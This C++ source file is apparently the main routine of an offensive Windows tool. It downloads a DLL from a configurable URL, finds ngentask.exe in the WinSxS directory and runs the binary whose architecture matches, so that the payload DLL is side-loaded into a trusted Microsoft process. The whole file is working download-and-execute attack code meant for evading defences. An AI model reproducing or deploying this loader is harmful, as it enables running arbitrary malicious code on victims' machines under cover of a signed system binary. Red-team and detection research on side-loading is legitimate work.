#include "winsos.h"

constexpr PWCHAR YOUR_URL_HERE = L"http://127.0.0.1:8080/target.dll";

int main(int argc, char *argv[])
{
    DisplayHeader();

    printf("[+] Downloading DLL...\n");
    if (!DownloadFile(YOUR_URL_HERE, DLL_NAME))
    {
        printf("[x] Failed to download the DLL. Please check if the URL is valid\n");
        return EXIT_FAILURE;
    }
    else
    {
        printf("\t[-] DLL saved successfully in the current directory\n");
    }

    printf("[+] Searching for ngentask binary in the WinSxS directory...\n");
    std::vector<std::wstring> pathList;
    SearchFileRecursive(L"C:\\Windows\\WinSxS", pathList);
    if (pathList.empty())
    {
        printf("[x] Failed to locate the ngentask.exe binary in the WinSxS directory\n");
        return EXIT_FAILURE;
    }
    else
    {
        for (auto &path : pathList)
        {
            wprintf(L"\t[-] Found ngentask.exe at %s\n", path.c_str());
        }
    }

    bool is64BitLibrary;

    std::wstring fullDllPath = GetDllCurrentFolder() + L"\\" + DLL_NAME;
    printf("[+] Checking the architecture of the DLL...\n");
    if (!Is64BitLibrary(fullDllPath.c_str(), is64BitLibrary))
    {
        printf("[x] Unable to identify the architecture of the library. Is it a valid PE file?\n");
        return EXIT_FAILURE;
    }
    else
    {
        if (is64BitLibrary)
        {
            printf("\t[-] The DLL is a 64-bit PE file\n");
        }
        else
        {
            printf("\t[-] The DLL is a 32-bit PE file\n");
        }
    }

    printf("[+] Ready to execute ngentask.exe\n");
    for (auto &path : pathList)
    {
        if (is64BitLibrary)
        {
            if (path.find(L"amd64") != std::wstring::npos)
            {
                ExecuteNgenTask(path.c_str());
                break;
            }
        }
        else
        {
            if (path.find(L"x86") != std::wstring::npos)
            {
                ExecuteNgenTask(path.c_str());
                break;
            }
        }
    }

    printf("[+] The DLL has been injected into ngentask.exe via DLL Side-Loading\n");

    return EXIT_SUCCESS;
}